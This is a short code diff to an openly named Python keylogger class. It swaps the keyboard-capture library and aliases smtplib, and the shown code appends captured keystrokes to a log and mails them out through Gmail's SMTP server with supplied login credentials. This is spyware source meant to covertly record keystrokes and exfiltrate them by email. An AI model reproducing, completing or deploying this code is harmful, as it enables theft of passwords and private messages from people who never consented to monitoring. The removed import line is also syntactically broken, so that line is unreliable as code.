@@ -1,7 +1,8 @@
-import smtplib
+import smtplib as slib
 import threading
 
-from pynput input keyboard
+import keyboard as keyboard
+#from pynput input keyboard
 
 class Keylogger:
     """Create the Keylogger class, define
@@ -31,7 +32,7 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server = slib.SMTP('smtp.gmail.com', 587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
